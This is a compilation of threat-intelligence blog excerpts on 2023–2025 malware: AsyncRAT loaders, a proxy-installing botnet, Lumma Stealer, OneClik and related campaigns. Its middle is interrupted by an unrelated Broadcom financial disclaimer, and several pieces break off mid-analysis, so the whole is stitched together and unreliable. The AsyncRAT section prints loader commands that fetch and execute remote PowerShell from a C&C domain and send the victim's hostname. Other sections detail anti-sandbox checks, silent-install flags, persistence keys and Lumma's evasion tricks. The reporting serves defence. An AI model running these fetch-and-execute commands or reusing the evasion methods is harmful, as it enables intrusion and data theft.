The dark side of 2023 Cybersecurity: Malware evolution and Cyber threats
January 25, 2024  |  Fernando Martinez
In the ever-evolving cybersecurity landscape, 2023 witnessed a dramatic surge in the sophistication of cyber threats and malware. Cybersecurity LevelBlue Labs reviewed the big events of 2023 and how malware morphed this year to try new ways to breach and wreak havoc.

This year's events kept cybersecurity experts on their toes, from expanding malware variants to introducing new threat actors and attack techniques. Here are some of the most compelling developments, highlighting malware's evolving capabilities and the challenges defenders face.

Highlights of the year: Emerging trends and notable incidents
As the year unfolded, several trends and incidents left an indelible mark on the cybersecurity landscape:

Exploiting OneNote for malicious payloads
Cybercriminals leveraged Microsoft OneNote to deliver many malicious payloads to victims, including Redline, AgentTesla, Quasar RAT, and others. This previously underutilized Office program became a favored tool due to its low suspicion and widespread usage.

SEO poisoning and Google Ads
Malicious actors resorted to SEO poisoning tactics, deploying phishing links through Google Ads to deceive unsuspecting victims. These links led to cloned, benign web pages, avoiding Google's detection and remaining active for extended periods. Prominent malware families, including Raccoon Stealer and IcedID, capitalized on this strategy.

Exploiting geopolitical events
Cybercriminals exploited the geopolitical climate, particularly the Middle East conflict, as a lure for their attacks. This trend mirrored the previous year's Ukraine-related phishing campaigns and crypto scams.

APTs: State-sponsored espionage continues to present challenges
Advanced Persistent Threats (APTs) continued to pose a significant threat in 2023:

Snake: CISA reported on the Snake APT, an advanced cyber-espionage tool associated with the Russian Federal Security Service (FSB). This malware had been in use for nearly two decades.
Volt Typhoon: A campaign targeting critical infrastructure organizations in the United States was attributed to Volt Typhoon, a state-sponsored actor based in China. Their focus lay on espionage and information gathering.
Storm-0558: This highly sophisticated intrusion campaign, orchestrated by the Storm-0558 APT from China, infiltrated the email accounts of approximately 25 organizations, including government agencies.
Ransomware's relentless rise
Ransomware remained a prevalent and lucrative threat throughout the year:

Cuba and Snatch: Ransomware groups like Cuba and Snatch targeted critical infrastructure in the United States, causing concern for national security.
ALPHV/BlackCat: Beyond SEO poisoning, this group compromised the computer systems of Caesar and MGM casinos. They also resorted to filing complaints with the US Securities and Exchange Commission (SEC) against their victims, applying additional pressure to pay ransoms.
Exploiting new vulnerabilities: Cybercriminals wasted no time exploiting newly discovered vulnerabilities, such as CVE-2023-22518 in Atlassian's Confluence, CVE-2023-4966 (Citrix bleed), and others. These vulnerabilities became gateways for ransomware attacks.
Evolving ransomware families: New ransomware variants like Trash Panda emerged while existing families adapted to target Linux and ESXi servers, further expanding their reach.
Notable blogs of the year
1. BlackGuard: Elevating Malware-as-a-Service

One of the year's standout stories was the evolution of BlackGuard, a formidable Malware-as-a-Service (MaaS) offered in underground forums and Telegram channels. This insidious tool underwent a significant upgrade, amplifying its capabilities. Already known for its ability to pilfer sensitive data from browsers, games, chats, and cryptocurrencies, the new BlackGuard variant upped the ante.

BlackGuard improved its Anti-Reversing and Sandboxing capabilities, making it even more elusive to security experts. Moreover, it could now tamper with cryptocurrency wallets copied to the clipboard. This enhancement posed a severe threat to cryptocurrency enthusiasts and investors. Additionally, BlackGuard incorporated advanced Loader capabilities, enabling it to propagate through shared or removable devices and mask its communications via public and private proxies or the anonymous Tor network.

2. SeroXen: A RAT's rapid ascent and fall

In a twist of fate, 2023 witnessed the meteoric rise and fall of SeroXen, a new variant of the Quasar Remote Access Trojan (RAT). This modified branch of the open-source RAT added significant modifications to its original framework, enhancing its capabilities.

SeroXen achieved quick notoriety, with hundreds of samples identified within the first few months of the year. However, shortly after the blog highlighting its emergence was published, the SeroXen website announced its shutdown and implemented a kill-switch, rendering infected PCs useless to malicious actors. It was a rare instance where the publication of research inadvertently led to the downfall of a malware tool.

3. AdLoad: Mac systems turned into proxy servers

Cybersecurity Alien Labs uncovered a devious malware campaign involving AdLoad. This malware ingeniously transformed users' Mac systems into proxy servers, then sold to third parties, including some with illicit purposes. The threat actor behind AdLoad infected target systems surreptitiously installed a proxy application in the background.

These infected systems were subsequently offered to proxy companies, portraying themselves as legitimate entities. Buyers exploited the benefits of these residential proxy botnets, enjoying anonymity, wide geographical availability, and high IP rotation for conducting nefarious activities, including SPAM campaigns.

Following the publication of the research blog, a similar campaign targeting Windows systems emerged. The modus operandi mirrored that of the Mac version but was tailored for Windows OS, significantly expanding the potential target pool and the impact of the proxy network.

4. AsyncRAT: The persistent phishing threat

Throughout 2023, cybersecurity experts observed a continuous influx of phishing emails using advanced techniques. These emails enticed victims to download a malicious JavaScript file, heavily obfuscated and armed with anti-sandboxing measures to evade detection. These attacks aimed to execute an AsyncRAT client on the compromised systems, granting attackers full remote access.

AsyncRAT loader: Obfuscation, DGAs, decoys and Govno
January 5, 2024  |  Fernando Martinez
Executive summary
LevlBlue Labs has identified a campaign to deliver AsyncRAT onto unsuspecting victim systems. During at least 11 months, this threat actor has been working on delivering the RAT through an initial JavaScript file, embedded in a phishing page. After more than 300 samples and over 100 domains later, the threat actor is persistent in their intentions.

Key takeaways:
The victims and their companies are carefully selected to broaden the impact of the campaign. Some of the identified targets manage key infrastructure in the US.
The loader uses a fair amount of obfuscation and anti-sandboxing techniques to elude automatic detections.
As part of the obfuscation, the attacker also uses a lot of variable’s names and values, which are randomly generated to harden pivot/detection by strings.
DGA domains are recycled every week and decoy redirections when a VM is identified to avoid analysis by researchers.
The ongoing registration of new and active domains indicates this campaign is still active.
There is an OTX pulse with more information.
Analysis
AsyncRAT is an open-source remote access tool released in 2019 and is still available in Github. As with any remote access tool, it can be leveraged as a Remote Access Trojan (RAT), especially in this case where it is free to access and use. For that reason, it is one of the most commonly used RATs; its characteristic elements include: Keylogging, exfiltration techniques, and/or initial access staging for final payload delivery.

Since it was initially released, this RAT has shown up in several campaigns with numerous alterations due to its open-sourced nature, even used by the APT Earth Berberoka as reported by TrendMicro.

In early September, LevelBlue Labs observed a spike in phishing emails, targeting specific individuals in certain companies. The gif attachment led to a svg file, which also led to a download of a highly obfuscated JavaScript file, followed by other obfuscated PowerShell scripts and a final execution of an AsyncRAT client. This peculiarity was also reported by some users in X (formerly Twitter), like reecDeep and Igal Lytzki. Certain patterns in the code allowed us to pivot and look for more samples in this campaign, resulting in samples going back to February 2023. The registration of domains and subsequent AsyncRAT samples is still being observed at the time of writing this blog.

AsyncRAT samples

Figure1: Number of samples observed by LevelBlue Labs in this campaign.

The modus operandi of the loader involves several stages which are further obfuscated by a Command and Control (C&C) server checking if the victim could be a sandbox prior to deploying the main AsyncRAT payload. In particular, when the C&C server doesn’t rely on the parameters sent, usually after stage 2, or when it is not expecting requests on a particular domain at that time, the C&C redirects to a benign page.

AsyncRAT execution flow

Figure 2. Execution flow.

During the whole campaign, JavaScript files have been delivered to targeted victims through malicious phishing webpages. These files, despite being clearly a script, contain long strings that are commented out, with texts composed of randomly positioned words, with ‘Melville’, ‘church’, ‘chapter’ and ‘scottish’ being the most repeated words. A similar sample delivering AsyncRAT showed up in March 2023 but hidden between what looks to be Sanskrit characters as reported by Ankit Anubhav in https://x.com/ankit_anubhav/status/1636714527218880515. However, that sample has different TTPs to deliver the final payload and could be part of a different campaign or executed by a different threat actor.

This script is highly obfuscated, with several functions to move around the detectable commands/strings, and with the URL to the C&C being obfuscated in the form of decimal values. In order to decrypt the URL, the script subtracts a constant to the value and converts the number into an ASCII character. For example, the following array of numbers (102 131 138 138 141 62 117 141 144 138 130 63), when subtracted by 30 and converted to ASCII, corresponds to the string ‘Hello World!’. This kind of ciphering can be observed later in Figure 3.

Figure 3. Extract of code from ec48d692547341789a9205f607983f9cd485435df4fefda1654a5eccbe12bfb0.

This file ends up executing the command ‘conhost --headless powershell iex(curl -useb sduyvzep[.]top/1.php?hash=)’. The C&C and URL are frequently updated, so it is hard to always have a Suricata detection for it. Some of these requests were already detected by Suricata rules like Emerging Threats (ET) rule signature ID 2048662, and others included in the Appendix.

On top of modifying the C&C and URL every so often, the threat actor tries to generate a completely new version of the loader for each victim. The new files carry new randomized variable names, or a new constant subtracted to get the ASCII representation of the URL, which makes detection techniques difficult to perform consistently.

After a GET request, the C&C sends a script over HTTP. This script contains base64 code, and the necessary functions to decode it. It is then XOR’ed against a hardcoded key in the script, unpacked with Gunzip, and copied to memory to execute the payload as fileless in PowerShell. Once again, all the code will have variables with long randomized strings, commands that are ciphered and need to be converted to ASCII, as well as functions to evade EDR, static detections and analysis by researchers.

After the decoding, decrypting and decompressing the code, the ending script can be summarized in the command ‘iex(curl -useb "http://sduyvzep[.]top/2.php?id=$env:computername&key=$wiqnfex")’ where $env:computername is the victim’s hostname. The second variable ‘$wiqnfex’ is a number of around 12 digits representing a value for the probability that the infected machine is a Virtual Machine or Sandbox.

These calculations for anti-sandboxing are as follows:

Get-MpComputerStatus | Select -ExpandProperty "IsVirtualMachine": This command pulls the Computer status from PowerShell and extracts the IsVirtualMachine value. There are three contemplated outputs:
a. True
b. False
c. 3
Get-WmiObject Win32_VideoController | Select-Object AdapterDACType | Out-String: The output represents the name or identifier of the digital-to-analog converter (DAC) chip. The expected outputs are:
a. Intel or SeaBIOS
b. Internal or Integrated
c. VMware or Bochs
Get-WmiObject -Namespace root\wmi -Query 'SELECT * FROM MSSmBios_RawSMBiosTables' | Select-Object Size: Using WMI, this command retrieves the SMBIOS data, in particular the number of items it has. The three possible values are:
a. Between 300-1000
b. Between 1000-12000
c. Between 13000-122442
Each result for the three commands gets assigned a different value. Every time an answer is matched, the value is added to the ‘$wiqnfex’ variable. If one of the commands doesn’t have a matched answer, the script won’t add any values to the result. On top of these three additions, there is always a constant value added to the variable, so the lowest possible result is never 0. For example, in the sample we have been analyzing in this blog, the values are:

ProxyNation: The dark nexus between proxy apps and malware
August 16, 2023  |  Ofer Caspi
Executive summary
LevelBlue Labs researchers recently discovered a massive campaign of threats delivering a proxy server application to Windows machines. A company is charging for proxy service on traffic that goes through those machines. This is a continuation of research described in our blog on Mac systems turned into proxy exit nodes by AdLoad.

In this research, Alien Labs identified a company that offers proxy services, wherein proxy requests are rerouted through compromised systems that have been transformed into residential exit nodes due to malware infiltration. Although the proxy website claims that its exit nodes come only from users who have been informed and agreed to the use of their device, Alien Labs has evidence that malware writers are installing the proxy silently in infected systems. In addition, as the proxy application is signed, it has no anti-virus detection, going under the radar of security companies.

In this follow up article we explore the dramatic rise in Windows malware delivering the same payload to create a 400,000 proxy botnet.

Key takeaways:
In just one week LevelBlue Labs researchers observed more than a thousand new malware samples in the wild delivering the proxy application.
According to the proxy website, there are more than 400,000 proxy exit nodes, and it is not clear how many of them were installed by malware.
The application is silently installed by malware on infected machines without user knowledge and interaction.
The proxy application is signed and has zero anti-virus detection.
The proxy is written in Go programming language and is spread by malware both on Windows and macOS.
Analysis
In the constantly evolving landscape of cyber threats, malicious actors continuously find new and ingenious ways to exploit technology for their own gain. Recently Alien Labs has observed an emerging trend where malware creators are utilizing proxy applications as their tool of choice. Different malware strains are delivering the proxy - relying on users looking for interesting things, like cracked software and games.

The proxy is written in the Go programming language, giving it the flexibility to be compiled into binaries compatible with various operating systems, including macOS and Windows. Despite the fact that the binaries originated from the same source code, macOS samples are detected by numerous security checks while the Windows proxy application skirts around these measures unseen. This lack of detection is most likely due to the application being signed. (Figure 1) 

proxy on VT 

Figure 1. As  on Virus Total: Proxy application – zero detections.

After being executed on a compromised system, the malware proceeds to quietly download and install the proxy application. This covert process takes place without requiring any user interaction and often occurs alongside the installation of additional malware or adware elements. The proxy application and most of the malware delivering it are packed using Inno Setup, a free and popular Windows installer.

installing proxy silently

Figure 2. As observed by Alien Labs: Malware embedded script to install the proxy silently.

As shown in the figure 2 above, the malware uses specific Inno Setup parameters to silently install the proxy by executing it with the following instructions:

“/SP-” - Disables the pop up “This will install... Do you wish to continue?” that usually prompts at the beginning of the windows Setup.
“/VERYSILENT” - When a setup is very silent the installation progress bar window is not displayed.
“/SUPPRESSMSGBOXES” - Instructs Setup to suppress message boxes. The setup automatically answers common interaction messages box with the user.
Furthermore, the malware transmits specific parameters directly to the proxy installation process, subsequently relaying them to the proxy’s command and control server (C&C) as part of the new peer registration process. These parameters play a crucial role in identifying the origin of the proxy propagation within the proxy command and control infrastructure.

The monetization of malware propagating proxy server through an affiliate program is troublesome, as it creates a formal structure to increase the speed at which this threat will spread. The downloaded proxy application is packed with Inno Setup as well, and the installation script is responsible both for installing its files and persistence. (Figure 3)

proxy installation script

Figure 3. As observed by Alien Labs: Proxy installation script.

The setup file drops two executable files:

“DigitalPulseService.exe” - Is the proxy server itself that communicates constantly with its exit node operator for further instructions.
“DigitalPulseUpdater” - Check and download for new proxy applications available.
The proxy persists in the system in two ways:

Run registry key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DigitalPulse
Windows schedule task named “DigitalPulseUpdateTask” that will be executed each hour: %AppData%\DigitalPulse\DigitalPulseUpdate.exe
The updater, which is executed through the schedule task, queries the server along with the machine unique GUID on hourly basis, to check for the presence of any update versions. (Figure 4)

proxy updater service

Figure 4. As observed by Alien Labs: Proxy updater service.

A response from the server will include the version and download link:

{"dd":"https://digitalpulsedata.s3.amazonaws[.]com/update/pp/0.16.14/DigitalPulseService.exe","vv":"0.0.16.14"}


The proxy then continuously gathers vital information from the machine to ensure optimal performance and responsiveness. This includes everything from process list and monitoring CPU to memory utilization and even tracking battery status. This dynamic data collection underscores its capability to manage the demands of proxy requests while evading suspicion by adapting to the system’s operational context. (Figure 5)

The proxy communicates with its command and control on port 7001 to receive further instructions. Figure 6 shows an example request from a proxy node server to get information from “www.google.de” from an infected device.

Conclusion
In the constantly changing world of cyber threats, the intertwined relationship between innovation and malicious intent propels new strategies by nefarious actors. The rise of malware delivering proxy applications as a lucrative investment, facilitated by affiliate programs, highlights the cunning nature of adversaries’ tactics. These proxies, covertly installed via alluring offers or compromised software, serve as channels for unauthorized financial gains. As we have examined, this underscores the importance of remaining vigilant and adaptive in the face of ever-evolving cyber threats.

Non-GAAP Financial Measures

The non-GAAP measures should not be considered as a substitute for, or superior to, measures of financial performance prepared in accordance with GAAP. A reconciliation between GAAP and non-GAAP financial data is included in the supplemental financial data attached to this press release. Broadcom believes non-GAAP financial information provides additional insight into the Company's on-going performance. Therefore, Broadcom provides this information to investors for a more consistent basis of comparison and to help them evaluate the results of the Company's on-going operations and enable more meaningful period to period comparisons. 

In addition to GAAP reporting, Broadcom provides investors with net income, operating income, gross margin, operating expenses, cash flow and other data on a non-GAAP basis. This non-GAAP information excludes amortization of acquisition-related intangible assets, stock-based compensation expense, restructuring and other charges, acquisition-related costs, including integration costs, non-GAAP tax reconciling adjustments, and other adjustments. Management does not believe that these items are reflective of the Company's underlying performance. Internally, these non-GAAP measures are significant measures used by management for purposes of evaluating the core operating performance of the Company, establishing internal budgets, calculating return on investment for development programs and growth initiatives, comparing performance with internal forecasts and targeted business models, strategic planning, evaluating and valuing potential acquisition candidates and how their operations compare to the Company's operations, and benchmarking performance externally against the Company's competitors. The exclusion of these and other similar items from Broadcom's non-GAAP financial results should not be interpreted as implying that these items are non-recurring, infrequent or unusual.

Free cash flow measures have limitations as they omit certain components of the overall cash flow statement and do not represent the residual cash flow available for discretionary expenditures. Investors should not consider presentation of free cash flow measures as implying that stockholders have any right to such cash. Broadcom's free cash flow may not be calculated in a manner comparable to similarly named measures used by other companies.

Lumma Stealer, a potent information-stealing malware, emerged in 2022, targeting sensitive data like browser-stored passwords, cryptocurrency wallets, and 2FA tokens. It spreads through phishing campaigns and malicious downloads, posing significant risks to individuals and organizations in the cybersecurity landscape.

Forcepoint has identified a distinctive Lumma Stealer campaign leveraging a sophisticated URL-based delivery mechanism to deploy malware. This campaign integrates multiple steps, beginning with URLs embedded within PDFs and followed by a series of dropper URLs. These techniques highlight an advanced level of obfuscation, designed to evade detection while tricking users into inadvertently executing malicious payloads. 

One standout feature of the campaign is the inclusion of a dynamic element: a unique password that is generated for every downloaded archive file. This behaviour adds another layer of complexity, making traditional signature-based detection and analysis more challenging. It also reflects the increasing adaptability of threat actors behind malware like Lumma Stealer, who continuously refine their delivery methods to outpace security solutions.

The campaign's file delivery chain highlights its intricate design: it begins with a URL leading to a PDF file, which contains another URL. This chain progresses through several intermediary URLs before eventually delivering a password-protected archive file. Within this archive file lies the executable payload that initiates the malware infection. This elaborate sequence not only demonstrates the technical sophistication of the threat but also underscores the importance of robust cybersecurity defences to detect and mitigate such evasive attacks.

The campaign's file delivery chain can be outlined as follows: 



Fig. 1 - Lumma attack chain

Stage 1: Initial Access – Malicious URLs via Legitimate Infrastructure
The Lumma Stealer campaign initiates with a strategically crafted URL that leads the user to a PDF file. At face value, both the URL and the document appear benign, effectively reducing suspicion and bypassing initial detection. The attackers leverage the credibility of widely recognized hosting services to host these malicious PDFs, including platforms like wsimg.com and cdn-website.com.

This abuse of legitimate infrastructure is a growing trend in cybercrime, aligning with Forcepoint X-Labs’ 2025 Future Insights report, which predicted a rise in attackers co-opting trusted services to blend into normal traffic and evade detection. Hosting malicious content on well-known platforms not only increases the chance of user interaction, since they seem familiar and trustworthy, but also challenges traditional URL-based detection mechanisms that rely heavily on reputation scores.

Once the user accesses the PDF, the document contains clickable links that seamlessly guide them further down the malware delivery chain. This stage is crucial in setting up the infection, relying on subtlety, familiarity, and trust to lure the victim in.

Examples of observed malicious URL patterns include:

hxxps://cdn-website[.]com/files/invoice_312456.pdf  
hxxps://wsimg[.]com/documents/job_offer_details.pdf  
Stage 2: Downloaded PDF – Social Engineering via Fake Bot Check
In the second stage of this campaign, the attacker delivers a malicious PDF file designed to resemble a standard "bot check" page, mimicking familiar visual elements that imply the user must verify they are human. This is a classic social engineering tactic meant to exploit user trust and urgency.

What makes this PDF particularly deceptive is that the entire page is clickable, not just specific buttons or links. Any user interaction—whether intentional or accidental—triggers a malicious embedded hyperlink, moving the victim seamlessly into the next stage of the attack chain.

Once clicked, the PDF launches a series of rapid URL redirections. These hops traverse through multiple intermediary domains before finally landing on the site hosting the actual payload. This multi-layered redirection strategy serves two key purposes:  

Evasion: It obscures the true destination of the link, making detection by security tools more challenging.
Obfuscation: It allows attackers to insert additional logic or checks (e.g., geofencing, user-agent filtering) along the way.
While the PDF may appear as a simple bot verification prompt, its true function is to quietly move the user deeper into the malicious infrastructure. 

OneClik: A ClickOnce-Based APT Campaign Targeting Energy, Oil and Gas Infrastructure
By Nico Paulo Yturriaga and Pham Duy Phuc · June 24, 2025

The Trellix Advanced Research Center has uncovered a sophisticated APT malware campaign that we’ve dubbed OneClik. It specifically targets the energy, oil, and gas sector through phishing attacks and the exploitation of Microsoft ClickOnce. The campaign exhibits characteristics aligned with Chinese-affiliated threat actors, though attribution remains cautious. Its methods reflect a broader shift toward “living off the land” tactics, blending malicious operations within cloud and enterprise tooling to evade traditional detection mechanisms.

This stealthy operation unfolds across three distinct variants (v1a,BPI-MDM, andv1d), each using a .NET-based loader ("OneClikNet") to deploy a sophisticated Golanguage backdoor ("RunnerBeacon") that communicates with threat actor infrastructure hidden behind legitimate AWS cloud services [3] (CloudFront, API Gateway, Lambda). This makes network-based detection nearly impossible without decryption or deep behavioral analysis.

Our analysis reveals how this campaign has progressively evolved with advanced evasion tactics and C2 obfuscation across each variant. Key findings include abuse of ClickOnce [1] to proxy execution, early injection via .NET AppDomainManager hijacking [2], and anti-analysis measures (anti-debugging loops and sandbox detection).

ClickOnce abuse background
ClickOnce is a Microsoft .NET deployment technology that allows self-updating applications to install and run from remote sources. Although intended for ease of deployment, adversaries can abuse ClickOnce for stealthy code execution [1].

ClickOnce apps launch under the Deployment Service (dfsvc.exe), enabling attackers to proxy execution of malicious payloads through this trusted host. Because ClickOnce applications run with user-level privileges (no user account control required), they offer an appealing delivery mechanism for threat actors aiming to avoid privilege escalation.

In OneClik, attackers sent emails with links to a fake “hardware analysis” site. Visiting the site led to a ClickOnce manifest (an .application file)—cloaked as a legitimate tool—silently downloading and executing. Once launched, the ClickOnce loader injects malicious code via .NET configuration tampering.

Specifically, the loader uses AppDomainManager hijacking (T1574.014) by crafting the .exe.config settings to load a remote malicious DLL at CLR startup [2]. This technique (“AppDomainManager injection”) causes the legitimate .NET executable (e.g.ZSATray.exe, umt.exe or ied.exe) to load an attacker-controlled assembly instead of its normal dependencies. With the loader in place, payload execution proceeds under dfsvc.exe, blending with benign ClickOnce activities.

Infection chain and technical analysis
Figure 1: Campaign infection chain
Figure 1: Campaign infection chain

The OneClik campaign’s infection chain unfolds in stages (Figure 1). In the v1a variant, the victim visited a phishing link from an email (e.g. analysis.html on an Azure Blob Storage) fetched [victim]_Hardware_Analysis_Tool.application. This launched [victim]_Hardware_Analysis_Tool.exe under dfsvc.exe, which in turn loaded a sidecar binary via compiled ClickOnce manifest (cdf-ms) hijack.

That legitimate binary (ZSATray.exe) was then run with a tempered .config. This secondary stage downloaded a .NET DLL and an encrypted shellcode (download temp.dat and fav.ico base64 blob respectively) into memory, eventually injecting a Golang based backdoor (the RunnerBeacon).
At Trellix, we’ve been closely tracking Iranian cyber operations for years. Our research has shown that Iran maintains a mature and diverse cyber capability, executed through a combination of government agencies, contractors, and loosely affiliated proxy groups. These actors are capable of a broad spectrum of operations—from espionage and wiper attacks to disruptive campaigns targeting critical infrastructure.

This blog breaks down how a commonly used JavaScript library was weaponized to deliver browser-based malware via compromised WordPress assets. Learn how attackers exploited frontend trust, what risks this poses to enterprises and governments, and how your organization can defend against these stealthy threats.
On May 7, 2025, the LockBit admin panel was hacked by an anonymous actor who replaced their TOR website with the text ‘Don’t do crime CRIME IS BAD xoxo from Prague’ and shared a SQL dump of their admin panel database in an archived file ‘paneldb_dump.zip’. This leaked SQL database dump is further significant as it offers significant insight into the operational methods of LockBit affiliates and the negotiation tactics they employ to secure ransom payments from their victims.
During regular proactive threat hunting, the Trellix Advanced Research Center identified a fully undetected infostealer malware sample written in Rust. Upon further investigation, we discovered that it was Myth Stealer. Stealer is consistently updated by malware author to evade AV detection. The blog covers functionality of the stealer observed in different versions.
On May 15th, Trellix's email security products alerted on a highly targeted spear-phishing operation aimed at CFOs and finance executives at banks, energy companies, insurers, and investment firms across Europe, Africa, Canada, the Middle East, and South Asia.
Imagine being hacked through a phone call, and you can't even complain because you were the one who provided your sensitive information or credentials. This is hacking through social engineering, which is essentially hacking without using any malicious code.

That's vishing! Vishing, short for voice phishing, is a type of social engineering attack where cybercriminals use phone calls or voice messages to manipulate individuals into divulging sensitive information, such as passwords, credit card numbers, or other personal details. 

In a typical vishing scenario, the attacker may claim that there is an urgent problem with your bank account, a prize you've won, or a technical issue that requires your immediate attention. The goal is to create a sense of urgency and pressure the victim into providing information quickly.
n today's rapidly evolving AI-fueled threat landscape, every organization is trying to stop threats as early as possible. Threat hunting and detection engineering are crucial components of a proactive cybersecurity strategy. Threat hunting involves actively searching for and identifying hidden threats that may have evaded existing security solutions. Detection engineering focuses on designing, implementing, and refining security detections to effectively identify and respond to threats. 

But where do you start? To help we wrote this comprehensive whitepaper about Detection Engineering, Threat Hunting, and how to implement both in your organization. If you’re not ready to delve deep into the paper, here’s a brief overview of how these combined tactics will  strengthen your organization's cybersecurity posture.

Threat hunting is essential because it enables organizations to:
Reduce attacker dwell time: By proactively searching for threats, organizations can identify and neutralize malicious activities before they escalate, minimizing potential damage.
Mitigate damage from unknown threats: Threat hunting helps uncover new or evolving attack tactics, techniques, and procedures (TTPs) that may not be detected by traditional security tools.
Strengthen organizational resilience: Organizations can enhance their ability to adapt to and defend against unfamiliar threat vectors by recognizing and responding to them.
3 types of threat hunting
IOC-based hunting: This reactive approach focuses on detecting known threat artifacts within the environment, such as file hashes, IP addresses, and domains.
TTP-based hunting: This approach emphasizes the detection of threat actor TTPs by understanding how attackers operate and identifying patterns or sequences of behavior that suggest malicious intent.
Hypothesis-driven hunting: This approach starts with an educated assumption about possible adversarial behavior based on threat intelligence, sector-specific attacks, organizational changes, or emerging threats to test the hypothesis. 
Detection engineering complements threat hunting by focusing on the development and refinement of threat detections. Key aspects of detection engineering include:
Signature-based detection: Identifying threats based on known malicious indicators.
Behavioral-based detection: Detecting threats based on their behavior and patterns.
Custom detection rules: Tailoring detection strategies to an organization's specific requirements and risks.
Continuous improvement: Regularly refining and adapting detections to address evolving threats and reduce false positives.
Key Stages of detection engineering include:
Develop and Build: Research adversarial TTPs, fine-tune existing detections, develop and test new detections, and create release candidates.  
Deliver: Validate release candidates and push them to production.
Inspect and Adapt: Identify anomalies (false positives and true positives) and continuously refine detection logic.
Threat hunting and detection engineering: The dynamic duo
Organizations can reduce attacker dwell time, mitigate damage from unknown threats, and strengthen their overall security posture by implementing these practices.
A combination of different threat hunting types and robust detection engineering processes is crucial for comprehensive threat detection and response.
Continuous learning, collaboration, and the integration of threat intelligence are key to the success of threat hunting and detection engineering programs.
How to get started
Organizations should prioritize the integration of threat hunting and detection engineering into their cybersecurity strategy. This includes:

Investing in skilled personnel: Develop and train cybersecurity professionals with expertise in threat hunting and detection engineering.
Implementing a structured methodology: Establish a well-defined threat hunting methodology and detection engineering process.
Leveraging threat intelligence: Integrate actionable threat intelligence into both threat hunting and detection engineering efforts.
Embracing continuous improvement: Continuously refine and adapt detection mechanisms based on threat hunting findings and emerging threats.
By taking these steps, organizations can proactively defend against evolving cyber threats and strengthen their overall cybersecurity posture.
Lumma Stealer, first identified in 2022, remains a significant threat to this day, continuously evolving its tactics, techniques, and procedures (TTPs) to stay aligned with emerging trends. It is distributed on the dark web via a subscription-based model, Malware-As-A-Service(MaaS). Lumma is designed to detect virtual and sandbox environments, allowing it to avoid detection by security systems that depend on the sandbox environment to assess the file behaviour. The malware is capable of exfiltrating sensitive data, including information from web browsers, email applications, cryptocurrency wallets, and other personally identifiable information (PII) stored in critical system directories.

The Trellix Advanced Research Center has been tracking recent campaigns by the threat actors behind Lumma Stealer and analyzing the evolution of their TTPs. In this blog we present our technical analysis on how Lumma performs the below objectives
During the analysis of the derived sample, the command and control (C2) servers were inactive, resulting in an incomplete behavioral analysis. To provide a thorough analysis for our readers, we have detailed the observed behavior of the latest Lumma sample, which may be delivered to the victim's environment via the technique previously discussed.

Sample hash (SHA256) : 80741061ccb6a337cbdf1b1b75c4fcfae7dd6ccde8ecc333fcae7bcca5dc8861

Performing code analysis on the Lumma’s binary, its main function begins by passing encrypted strings to a decryption routine. The first string to be decrypted is "ntdll.dll". Similarly, the names of other important libraries such as kernel32.dll, user32.dll, winhttp.dll, and crypt32.dll are also decrypted during runtime.

The decrypted string is passed as an argument to a function that leverages Process Environment Block (PEB) data structure in Windows to resolve the library's address in memory. With this technique, Lumma avoids calling very commonly monitored APIs like LoadLibrary and GetProcAddress, which are scrutinized by EDR and other security systems.

Code flow obfuscation
Lumma employs advanced codeflow obfuscation techniques to significantly complicate the analysis. As a result, this malware makes it difficult for decompilers(a commonly used tool in malware analysis) to fully decompile the code.

Due to this, static analysis methods are rendered ineffective in revealing the complete logic of the program.

Figure 6: The next instruction is determined by calculating ECX, with the green
      box highlighting the calculation used to derive ECX
Figure 6: The next instruction is determined by calculating ECX, with the green box highlighting the calculation used to derive ECX

From the image above, the larger box highlights the routine responsible for calculating the next jump, while the smaller box shows a jump instruction that contains the next instruction address in the “ecx” register. As a result, the code-blocks are scattered without any static links between them, the links (i.e.,addresses to the next valid code-block) are calculated dynamically, resulting in the decompiler failing to analyze the code accurately and the code-flow is broken. Lumma Stealer extends this obfuscation technique to control flow statements such as If-Else and Do-While, further complicating the analysis.

Additionally, the calculation varies with each jump, making it difficult to automate or clean the code effectively. In this case, the jump leads to the immediate next instruction at address ECX = 0067BCD6 (Refer Image). 

API hash resolving
Lumma uses an API hashing technique to dynamically resolve API functions during runtime, a common method employed by malware to locate APIs as needed.

Below listed are a few API’s resolved by Lumma dynamically,

RtlAllocateHeap
RtlReAllocateHeap
RtlFreeHeap
RtlExpandEnvironmentStrings
Also, APIs required for networking are resolved using the same function.

Lumma sample being 32-bit, it uses Heaven’s gate technique to run 64-bit code when it is executed on a 64-bit machine.

Heaven’s gate 
Lumma identifies whether it’s running on a 32-bit or 64-bit machine by comparing the value of the Code Segment (CS) register.

If the value is 0x23. Then it's a 32-bit machine.

If the value is 0x33. Then it's a 64-bit machine.

When running on a 64-bit system, Lumma transitions to 64-bit code using the ‘jmp far 33’ instruction.

Figure 7: Jmp far instruction for 32 to 64 bit transition
Figure 7: Jmp far instruction for 32 to 64 bit transition

To invoke NTAPI functions, Lumma constructs a table that includes Syscall Hashes and Syscall Indexes. It traverses the export table of the ntdll.dll library to generate custom hashes for API names starting with "Nt" such as NtQueryInformationFile and NtOpenFile.

Lumma hashes syscalls based on their opcode pattern. Specifically,

Syscalls that begin with the opcode B8 and end with a return opcode of C2 or C3 are considered for hashing
Figure 8: Hashing Criteria
Figure 8: Hashing Criteria

Below image depicts the syscalls matching above discussed pattern.

For example:

NtYieldExecution syscall starts with B8 and returns using “C3” opcode
NtAddAtom syscall starts with B8 and returns using “C2” opcode
Figure 9: Debugger snippet
Figure 9: Debugger snippet

On the other hand, syscalls like NtCurrentTeb, which do not start with B8, are excluded from the Syscall hash table.

Figure 10: NtCurrentTeb Syscall pattern not matching the hashing
      criteria
Figure 10: NtCurrentTeb Syscall pattern not matching the hashing criteria

Syscall hash/index table
Figure 11: Syscall hash table
Figure 11: Syscall hash table

The above image shows the syscall table, A DWORD (hash) followed by another DWORD containing “Syscall Index”.

For instance, the first DWORD is the hash value for the NtAcceptConnectPort/ZwAcceptConnectPort API (Index = 2) followed by the second DWORD consisting of the syscall index(2). Whenever Lumma has to Invoke a NTAPI, it finds the syscall index by traversing the table and matching on the respective hash.

Figure 12: ZwAcceptConnectionPort Syscall pattern
Figure 12: ZwAcceptConnectionPort Syscall pattern

NTDLL Re-mapping
Lumma leverages the syscall table to remap ntdll.dll based on the system architecture. The correct version of the DLL (32-bit or 64-bit) is determined by checking the value of the Code Segment (CS) register.

On a 32-bit system, knowndlls32/ntdll.dll is mapped.

